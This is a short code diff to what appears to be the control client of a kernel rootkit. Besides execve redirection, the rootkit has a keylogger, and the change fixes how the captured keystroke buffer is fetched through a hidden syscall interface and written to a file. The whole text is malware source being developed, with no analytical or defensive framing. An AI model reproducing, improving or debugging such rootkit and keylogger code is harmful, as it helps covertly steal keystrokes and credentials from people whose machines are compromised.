@@ -161,6 +161,7 @@ void unredirect_execve(char *path)
 
 void get_keylogger_buf(const char *path)
 {
+	long ret;
 	struct rk_args args;
 	char keylogger_buf[1024];
 	FILE *fp;
@@ -175,10 +176,10 @@ void get_keylogger_buf(const char *path)
 
 	args.p_param1 = (char *)keylogger_buf;
 	args.param2 = sizeof(keylogger_buf);
-	anima_control(SYSCALL_GET_KEYLOGGER_BUF, &args);
+	ret = anima_control(SYSCALL_GET_KEYLOGGER_BUF, &args);
 
 
-	fwrite(keylogger_buf, 1, sizeof(keylogger_buf), fp);
+	fwrite(keylogger_buf, 1, ret, fp);
 	fclose(fp);
 }
 
